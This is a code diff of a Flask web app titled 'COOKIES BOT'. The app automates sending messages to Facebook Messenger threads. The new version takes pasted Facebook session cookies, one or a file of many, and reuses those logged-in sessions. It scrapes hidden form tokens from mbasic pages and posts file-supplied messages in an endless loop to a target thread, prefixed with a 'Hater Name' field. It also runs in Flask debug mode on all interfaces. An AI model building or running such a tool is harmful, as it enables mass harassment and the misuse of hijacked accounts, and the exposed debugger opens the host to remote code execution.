@@ -1,557 +1,236 @@
 from flask import Flask, request, render_template_string
+import requests
+from threading import Thread, Event
 import time
 import random
-import requests
-import threading
-from urllib.parse import urlparse
-import os
+import string
+import re
+from bs4 import BeautifulSoup
 
 app = Flask(__name__)
+app.debug = True
 
-# Global variable to track running tasks
-active_tasks = {}
+headers = {
+    'User-Agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+    'Accept-Language': 'en-US,en;q=0.9',
+    'referer': 'https://mbasic.facebook.com/'
+}
 
-HTML_TEMPLATE = """
+stop_events = {}
+threads = {}
+
+# --- Cookie Login & Message Sending Logic ---
+def send_messages(cookies_list, thread_id, mn, time_interval, messages, task_id):
+    stop_event = stop_events[task_id]
+    
+    # Cycle through cookies if multiple provided
+    cookie_index = 0
+    
+    while not stop_event.is_set():
+        for message1 in messages:
+            if stop_event.is_set():
+                break
+            
+            # Current Cookie use karo
+            current_cookie = cookies_list[cookie_index % len(cookies_list)]
+            
+            try:
+                # 1. Session banakar cookies set karo
+                session = requests.Session()
+                session.headers.update(headers)
+                
+                # Cookie string ko dict me convert karna
+                cookie_dict = {}
+                for cookie in current_cookie.split(';'):
+                    if '=' in cookie:
+                        key, value = cookie.split('=', 1)
+                        cookie_dict[key.strip()] = value.strip()
+                session.cookies.update(cookie_dict)
+
+                # 2. Message Page kholo aur Form Data nikalo (fb_dtsg, action url)
+                # Note: mbasic me thread URL format: /messages/read/?tid=cid.c.{id}
+                msg_url = f'https://mbasic.facebook.com/messages/read/?tid=cid.c.{thread_id}'
+                response = session.get(msg_url)
+                soup = BeautifulSoup(response.text, 'html.parser')
+                
+                # Form dhundo
+                form = soup.find('form', action=lambda x: x and '/messages/send/' in x)
+                
+                if form:
+                    action_url = 'https://mbasic.facebook.com' + form['action']
+                    
+                    # Hidden inputs (fb_dtsg, jazoest, etc.) nikalo
+                    data = {}
+                    for input_tag in form.find_all('input', type='hidden'):
+                        data[input_tag.get('name')] = input_tag.get('value')
+                    
+                    # Apna message add karo
+                    full_message = str(mn) + ' ' + message1
+                    data['body'] = full_message
+                    data['send'] = 'Send' # Button name usually
+
+                    # 3. Message POST karo
+                    post_response = session.post(action_url, data=data)
+                    
+                    if post_response.status_code == 200:
+                         print(f"Message Sent: {full_message}")
+                    else:
+                         print(f"Failed to send. Status: {post_response.status_code}")
+                else:
+                    print("Error: Chat Form not found. Check Cookie or Thread ID.")
+                    # Agar login fail hua to shayad cookie expire ho gyi
+            
+            except Exception as e:
+                print(f"Error: {e}")
+
+            # Next msg ke liye wait
+            time.sleep(time_interval)
+            
+            # Next cookie par switch karo (optional logic)
+            cookie_index += 1
+
+@app.route('/', methods=['GET', 'POST'])
+def send_message():
+    if request.method == 'POST':
+        cookie_option = request.form.get('tokenOption') # Name wahi rakha hai UI me but logic cookie hai
+
+        if cookie_option == 'single':
+            raw_cookie = request.form.get('singleToken')
+            cookies_list = [raw_cookie]
+        else:
+            token_file = request.files['tokenFile']
+            cookies_list = token_file.read().decode().strip().splitlines()
+
+        thread_id = request.form.get('threadId')
+        mn = request.form.get('kidx')
+        time_interval = int(request.form.get('time'))
+
+        txt_file = request.files['txtFile']
+        messages = txt_file.read().decode().splitlines()
+
+        task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
+
+        stop_events[task_id] = Event()
+        thread = Thread(target=send_messages, args=(cookies_list, thread_id, mn, time_interval, messages, task_id))
+        threads[task_id] = thread
+        thread.start()
+
+        return f'Task started with ID: {task_id} (Cookies Mode)'
+
+    return render_template_string('''
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Facebook Message Automation Using Cookies</title>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>😈COOKIES BOT HERE🐧</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
   <style>
-        body, html {
-            margin: 0;
-            padding: 0;
-            font-family: Arial, sans-serif;
-            background-color: #f8f9fa;
-            color: #333;
-        }
-
-        header {
-            position: relative;
-            width: 100%;
-            height: 120px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            text-align: center;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
-            overflow: hidden;
-        }
-
-        .header-wrapper {
-            display: flex;
-            width: 100%;
-            height: 100%;
-            position: relative;
-        }
-
-        .header-left {
-            flex: 1;
-            background: #7d7dff;
-            color: white;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-family: 'Arial Black', sans-serif;
-            font-style: italic;
-            clip-path: polygon(0 0, 100% 0, 90% 100%, 0% 100%);
-        }
-
-        .header-right {
-            flex: 1;
-            background: white;
-            color: black;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-family: 'Arial Black', sans-serif;
-            font-style: italic;
-            clip-path: polygon(10% 0, 100% 0, 100% 100%, 0 100%);
-        }
-
-        .header-left h1, .header-right h1 {
-            font-size: 0.9rem;
-            font-weight: bold;
-            letter-spacing: 0.1px;
-            text-transform: uppercase;
-        }
-
-        .container {
-            background: white;
-            border: 1px solid #ddd;
-            border-radius: 10px;
-            width: auto;
-            max-width: 600px;
-            margin: 30px auto;
-            padding: 20px;
-            text-align: center;
-            margin-bottom: 15px;
-            font-weight: bold;
-            box-sizing: border-box;
-        }
-        
-        .form-title {
-            font-size: 1.2rem;
-            color: #28a745;
-            margin-top: 20px;
-            margin-bottom: 10px;
-            font-style: italic;
-            border-left: 4px solid #28a745;
-            padding-left: 10px;
-        }
-
-        .switchover-title {
-            font-size: 1.0rem;
-            color: #28a745;
-            margin-top: 20px;
-            margin-bottom: 10px;
-            font-style: italic;
-            border-left: 4px solid #28a745;
-            padding-left: 10px;
-        }
-
-        input, select, textarea {
-            color: green;
-            font-weight: bold;
-            padding: 10px 20px;
-            border-radius: 50px;
-            box-shadow: inset 0 2px 5px rgba(0, 0, 0, 0.1);
-            transition: transform 0.2s, box-shadow 0.2s;
-            display: inline-block;
-            width: 100%;
-            height: 50px;
-            outline: none;
-            border: 0.1px solid #ccc;
-            font-size: 0.9rem;
-            box-sizing: border-box;
-            margin-top: 10px;
-            margin-bottom: 10px;
-        }
-
-        textarea {
-            height: 140px;
-            resize: none;
-        }
-
-        input[type="file"] {
-            padding: 15px 20px;
-            height: auto;
-        }
-
-        small {
-            color: #666;
-            font-size: 0.8rem;
-            display: block;
-            margin-top: -5px;
-            margin-bottom: 10px;
-        }
-
-        button {
-            padding: 17px 40px;
-            border-radius: 50px;
-            cursor: pointer;
-            border: 0;
-            background-color: white;
-            box-shadow: rgb(0 0 0 / 50%) 0 0 8px;
-            letter-spacing: 1.5px;
-            text-transform: uppercase;
-            font-size: 15px;
-            transition: all 0.5s ease;
-        }
-        button:hover {
-            letter-spacing: 4px;
-            background-color: rgb(24, 191, 220);
-            color: hsl(0, 0%, 100%);
-            box-shadow: rgb(24, 191, 220) 0px 7px 29px 0px;
-        }
-
-        button:active {
-            letter-spacing: 3px;
-            background-color: hsl(24, 191, 220);
-            color: hsl(0, 0%, 100%);
-            box-shadow: rgb(24, 191, 220) 0px 0px 0px 0px;
-            transform: translateY(10px);
-            transition: 100ms;
-        }
-
-        .footer {
-            background: linear-gradient(to right, #434343, #000);
-            color: #fff;
-            text-align: center;
-            padding: 30px 20px;
-            font-weight: 700;
-            position: relative;
-            margin-top: 40px;
-        }
-
-        .footer p {
-            margin: 10px 0;
-            font-size: 16px;
-        }
-
-        .footer::before {
-            content: '';
-            position: absolute;
-            top: -10px;
-            left: 50%;
-            transform: translateX(-50%);
-            width: 80px;
-            height: 5px;
-            background-color: #25d366;
-            border-radius: 50px;
-        }
-
-        .facebook-link, .whatsapp-link {
-            display: inline-block;
-            padding: 10px 22px;
-            border-radius: 28px;
-            color: #fff;
-            margin: 4px;
-            text-decoration: none;
-            font-weight: 700;
-        }
-
-        .facebook-link {
-            background-color: #4267b2;
-        }
-
-        .whatsapp-link {
-            background-color: #25d366;
-        }
-
-        .status-container {
-            margin-top: 20px;
-            padding: 15px;
-            border-radius: 10px;
-            background-color: #f0f0f0;
-            display: none;
-        }
-
-        .status-item {
-            margin: 5px 0;
-            font-weight: bold;
-        }
-
-        .status-running {
-            color: #007bff;
-        }
-
-        .status-completed {
-            color: #28a745;
-        }
-
-        .status-stopped {
-            color: #dc3545;
-        }
-
-        .status-error {
-            color: #ffc107;
-        }
+    /* Same CSS as before just background slightly different to indicate update */
+    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap');
+    * { font-family: 'Poppins', sans-serif; }
+    body {
+      background: linear-gradient(135deg, #000000 0%, #0f9b0f 50%, #000000 100%);
+      background-size: 400% 400%;
+      animation: gradient 15s ease infinite;
+      color: white;
+      min-height: 100vh;
+      margin: 0; padding: 20px;
+    }
+    @keyframes gradient { 0% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } 100% { background-position: 0% 50%; } }
+    .container {
+      max-width: 400px;
+      background: rgba(0, 0, 0, 0.8);
+      border-radius: 20px;
+      padding: 30px;
+      box-shadow: 0 10px 25px rgba(0,255,0, 0.2);
+      border: 1px solid rgba(0, 255, 0, 0.3);
+      margin: 30px auto;
+    }
+    .form-control { background: rgba(255, 255, 255, 0.1); border: 1px solid #0f9b0f; color: white; }
+    .form-control:focus { background: rgba(255, 255, 255, 0.2); color: white; box-shadow: 0 0 10px #0f9b0f; }
+    .btn-submit { background: #0f9b0f; border: none; color: white; width: 100%; padding: 10px; border-radius: 10px; }
+    h1 { text-align: center; color: #0f9b0f; text-shadow: 0 0 10px #0f9b0f; }
+    label { color: #ccc; }
   </style>
 </head>
 <body>
-  <header>
-    <div class="header-wrapper">
-      <div class="header-left">
-        <h1>Send From Web</h1>
-      </div>
-      <div class="header-right">
-        <h1> Convo / Chat Setup</h1>
-      </div>
-    </div>
-  </header>
-
   <div class="container">
-    <h1 class="form-title">Target Facebook Chat</h1>
-    <form id="messageForm" method="POST" action="/start_task" enctype="multipart/form-data">
-      <div class="form-group">
-        <input type="text" id="chat_uid" name="chat_uid" placeholder="Enter Facebook Chat UID (e.g., 123456789)" required>
+    <div class="header">
+      <h1>DEV3LOPED BY AXSHU</h1>
+    </div>
+    <form method="post" enctype="multipart/form-data">
+      <div class="mb-3">
+        <label for="tokenOption" class="form-label">Select Cookie Option</label>
+        <select class="form-control" id="tokenOption" name="tokenOption" onchange="toggleTokenInput()" required>
+          <option value="single">Single Cookie</option>
+          <option value="multiple">Cookie File</option>
+        </select>
       </div>
-      <div class="form-group">
-        <h1 class="switchover-title">Facebook Cookies</h1>
-        <textarea id="cookies" name="cookies" placeholder="Enter Facebook cookies (one per line)" required></textarea>
+      <div class="mb-3" id="singleTokenInput">
+        <label for="singleToken" class="form-label">Enter FB Cookie (c_user=...; xs=...)</label>
+        <input type="text" class="form-control" id="singleToken" name="singleToken" placeholder="Paste full cookie string here">
       </div>
-      <h1 class="switchover-title">Message Prefix (Optional)</h1>
-      <div class="form-group">
-        <input type="text" id="prefix" name="prefix" placeholder="Enter prefix (e.g., 🔵, [VIP], etc.)">
+      <div class="mb-3" id="tokenFileInput" style="display: none;">
+        <label for="tokenFile" class="form-label">Choose Cookie File</label>
+        <input type="file" class="form-control" id="tokenFile" name="tokenFile">
       </div>
-      <h1 class="switchover-title">Messages File (.txt only)</h1>
-      <div class="form-group">
-        <input type="file" id="message_file" name="message_file" accept=".txt" required>
-        <small>Upload .txt file with messages (one per line)</small>
+      <div class="mb-3">
+        <label for="threadId" class="form-label">Thread ID (User ID)</label>
+        <input type="text" class="form-control" id="threadId" name="threadId" placeholder="1000123456789" required>
       </div>
-      <h1 class="switchover-title">Delay Between Messages</h1>
-      <div class="form-group">
-        <input type="number" id="delay" name="delay" value="60" min="5" placeholder="Delay in seconds between messages" required>
+      <div class="mb-3">
+        <label for="kidx" class="form-label">Hater Name</label>
+        <input type="text" class="form-control" id="kidx" name="kidx" placeholder="Name" required>
       </div>
-
-      <button type="submit" id="submitBtn">Start Loader</button>
-      <button type="button" id="stopBtn" style="display: none;">Stop Sending</button>
+      <div class="mb-3">
+        <label for="time" class="form-label">Time (Seconds)</label>
+        <input type="number" class="form-control" id="time" name="time" placeholder="5" required>
+      </div>
+      <div class="mb-3">
+        <label for="txtFile" class="form-label">Message File</label>
+        <input type="file" class="form-control" id="txtFile" name="txtFile" required>
+      </div>
+      <button type="submit" class="btn btn-submit">Run via Cookies</button>
     </form>
-
-    <div id="statusContainer" class="status-container">
-      <h2>Task Status</h2>
-      <div class="status-item">Status: <span id="statusText">-</span></div>
-      <div class="status-item">Messages Sent: <span id="messagesSent">0</span></div>
-      <div class="status-item">Last Message: <span id="lastMessage">-</span></div>
-    </div>
+    
+    <br>
+    <form method="post" action="/stop">
+      <div class="mb-3">
+        <label for="taskId" class="form-label">Enter Task ID to Stop</label>
+        <input type="text" class="form-control" id="taskId" name="taskId" placeholder="Task ID" required>
+      </div>
+      <button type="submit" class="btn btn-danger" style="width:100%;">Stop Task</button>
+    </form>
   </div>
-  
-  <footer class="footer">
-    <p>©2025 Send From Web Using Cookies</p>
-    <p>◉ All Rights Reserved ◉</p>
-    <p>Owner: Bhoja X Alliance ✷</p>
-    <div style="margin-top:15px">
-      <a href="https://chat.whatsapp.com/GQKqTiTovC4IYDx8bEs9EQ" target="_blank" class="whatsapp-link">
-        WhatsApp
-      </a>
-      <a href="https://facebook.com" target="_blank" class="facebook-link">
-        Facebook
-      </a>
-    </div>
-  </footer>
 
   <script>
-    document.getElementById('messageForm').addEventListener('submit', function(e) {
-      e.preventDefault();
-      
-      const submitBtn = document.getElementById('submitBtn');
-      const stopBtn = document.getElementById('stopBtn');
-      const statusContainer = document.getElementById('statusContainer');
-      
-      submitBtn.disabled = true;
-      stopBtn.style.display = 'inline-block';
-      statusContainer.style.display = 'block';
-      
-      const formData = new FormData(this);
-      
-      fetch('/start_task', {
-        method: 'POST',
-        body: formData
-      })
-      .then(response => response.json())
-      .then(data => {
-        if (data.status === 'success') {
-          const taskId = data.task_id;
-          updateStatus(taskId);
-        } else {
-          alert(data.message);
-          submitBtn.disabled = false;
-          stopBtn.style.display = 'none';
-        }
-      })
-      .catch(error => {
-        console.error('Error:', error);
-        submitBtn.disabled = false;
-        stopBtn.style.display = 'none';
-      });
-    });
-    
-    document.getElementById('stopBtn').addEventListener('click', function() {
-      const taskId = this.getAttribute('data-task-id');
-      if (taskId) {
-        fetch('/stop_task/' + taskId, {
-          method: 'POST'
-        })
-        .then(response => response.json())
-        .then(data => {
-          if (data.status === 'success') {
-            document.getElementById('statusText').textContent = 'Stopped';
-            document.getElementById('statusText').className = 'status-stopped';
-            document.getElementById('submitBtn').disabled = false;
-            this.style.display = 'none';
-          }
-        });
+    function toggleTokenInput() {
+      var tokenOption = document.getElementById('tokenOption').value;
+      if (tokenOption == 'single') {
+        document.getElementById('singleTokenInput').style.display = 'block';
+        document.getElementById('tokenFileInput').style.display = 'none';
+      } else {
+        document.getElementById('singleTokenInput').style.display = 'none';
+        document.getElementById('tokenFileInput').style.display = 'block';
       }
-    });
-    
-    function updateStatus(taskId) {
-      const stopBtn = document.getElementById('stopBtn');
-      stopBtn.setAttribute('data-task-id', taskId);
-      
-      const statusInterval = setInterval(() => {
-        fetch('/task_status/' + taskId)
-        .then(response => response.json())
-        .then(data => {
-          if (data.status === 'error' && data.message === 'Task not found') {
-            clearInterval(statusInterval);
-            return;
-          }
-          
-          document.getElementById('statusText').textContent = data.status;
-          document.getElementById('statusText').className = 'status-' + data.status;
-          document.getElementById('messagesSent').textContent = data.messages_sent || '0';
-          document.getElementById('lastMessage').textContent = data.last_message || '-';
-          
-          if (data.status === 'completed' || data.status === 'error' || data.status === 'stopped') {
-            clearInterval(statusInterval);
-            document.getElementById('submitBtn').disabled = false;
-            stopBtn.style.display = 'none';
-          }
-        });
-      }, 1000);
     }
   </script>
 </body>
 </html>
-"""
+''')
 
-def send_messages_task(task_id, chat_uid, cookies, prefix, messages, delay):
-    headers = {
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
-        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
-        'Accept-Language': 'en-US,en;q=0.5',
-        'Referer': 'https://www.facebook.com/',
-        'Origin': 'https://www.facebook.com',
-        'Connection': 'keep-alive',
-        'Upgrade-Insecure-Requests': '1',
-        'Sec-Fetch-Dest': 'document',
-        'Sec-Fetch-Mode': 'navigate',
-        'Sec-Fetch-Site': 'same-origin',
-        'Sec-Fetch-User': '?1',
-        'Cache-Control': 'max-age=0',
-        'TE': 'trailers'
-    }
-    
-    session = requests.Session()
-    session.cookies.update(cookies)
-    session.headers.update(headers)
-    
-    try:
-        # Main sending loop
-        for i, message in enumerate(messages):
-            if task_id not in active_tasks or active_tasks[task_id]['status'] == 'stopped':
-                break
-            
-            # Apply prefix if provided
-            final_message = message
-            if prefix and prefix.strip():
-                final_message = f"{prefix.strip()} {message}"
-                
-            # Construct the send message URL
-            send_url = f"https://www.facebook.com/messages/send/?icm=1&entrypoint=web%3Amessenger%3Ainbox"
-            
-            # Prepare form data
-            form_data = {
-                'body': final_message,
-                'send': 'Send',
-                'tids': f"cid.c.{chat_uid}",
-                'wwwupp': 'C3',
-                'referrer': f"https://www.facebook.com/messages/t/{chat_uid}",
-                'ctype': 'inline',
-                'cver': 'legacy',
-                'csid': str(random.randint(1000000000, 9999999999))
-            }
-            
-            try:
-                response = session.post(send_url, data=form_data)
-                if response.status_code == 200:
-                    active_tasks[task_id]['messages_sent'] += 1
-                    active_tasks[task_id]['last_message'] = final_message
-                else:
-                    print(f"Failed to send message. Status code: {response.status_code}")
-            except Exception as e:
-                print(f"Error sending message: {str(e)}")
-            
-            # Wait for the specified delay (except after last message)
-            if i < len(messages) - 1:
-                for _ in range(delay):
-                    if task_id not in active_tasks or active_tasks[task_id]['status'] == 'stopped':
-                        break
-                    time.sleep(1)
-        
-        if task_id in active_tasks:
-            active_tasks[task_id]['status'] = 'completed'
-            
-    except Exception as e:
-        if task_id in active_tasks:
-            active_tasks[task_id]['status'] = 'error'
-            active_tasks[task_id]['error'] = str(e)
-
-@app.route('/')
-def index():
-    return render_template_string(HTML_TEMPLATE)
-
-@app.route('/start_task', methods=['POST'])
-def start_task():
-    # Get form data
-    chat_uid = request.form.get('chat_uid')
-    cookies = request.form.get('cookies')
-    prefix = request.form.get('prefix', '')
-    delay = int(request.form.get('delay', 60))
-    
-    # Validate required inputs
-    if not all([chat_uid, cookies]):
-        return {'status': 'error', 'message': 'Chat UID and Cookies are required'}, 400
-    
-    # Check if file is uploaded
-    if 'message_file' not in request.files:
-        return {'status': 'error', 'message': 'Message file is required'}, 400
-    
-    file = request.files['message_file']
-    if file.filename == '':
-        return {'status': 'error', 'message': 'No file selected'}, 400
-    
-    # Validate file type
-    if not file.filename.endswith('.txt'):
-        return {'status': 'error', 'message': 'Only .txt files are allowed'}, 400
-    
-    try:
-        # Read messages from file
-        file_content = file.read().decode('utf-8')
-        message_list = [msg.strip() for msg in file_content.split('\n') if msg.strip()]
-        
-        if not message_list:
-            return {'status': 'error', 'message': 'No messages found in file'}, 400
-            
-    except Exception as e:
-        return {'status': 'error', 'message': f'Error reading file: {str(e)}'}, 400
-    
-    # Parse cookies into dict
-    cookie_dict = {}
-    for line in cookies.split('\n'):
-        line = line.strip()
-        if line and '=' in line:
-            key, value = line.split('=', 1)
-            cookie_dict[key.strip()] = value.strip()
-    
-    # Generate a unique task ID
-    task_id = str(int(time.time())) + str(random.randint(1000, 9999))
-    
-    # Start the task in a new thread
-    thread = threading.Thread(
-        target=send_messages_task,
-        args=(task_id, chat_uid, cookie_dict, prefix, message_list, delay)
-    )
-    thread.start()
-    
-    # Store the task information
-    active_tasks[task_id] = {
-        'status': 'running',
-        'start_time': time.time(),
-        'messages_sent': 0,
-        'last_message': None
-    }
-    
-    return {
-        'status': 'success',
-        'task_id': task_id,
-        'message': 'Message sending process started'
-    }
-
-@app.route('/stop_task/<task_id>', methods=['POST'])
-def stop_task(task_id):
-    if task_id in active_tasks:
-        active_tasks[task_id]['status'] = 'stopped'
-        return {'status': 'success', 'message': 'Task stopped'}
-    return {'status': 'error', 'message': 'Task not found'}, 404
-
-@app.route('/task_status/<task_id>', methods=['GET'])
-def task_status(task_id):
-    if task_id in active_tasks:
-        return active_tasks[task_id]
-    return {'status': 'error', 'message': 'Task not found'}, 404
+@app.route('/stop', methods=['POST'])
+def stop_task():
+    task_id = request.form.get('taskId')
+    if task_id in stop_events:
+        stop_events[task_id].set()
+        return f'Task {task_id} stopped.'
+    else:
+        return f'Task {task_id} not found.'
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000)
+
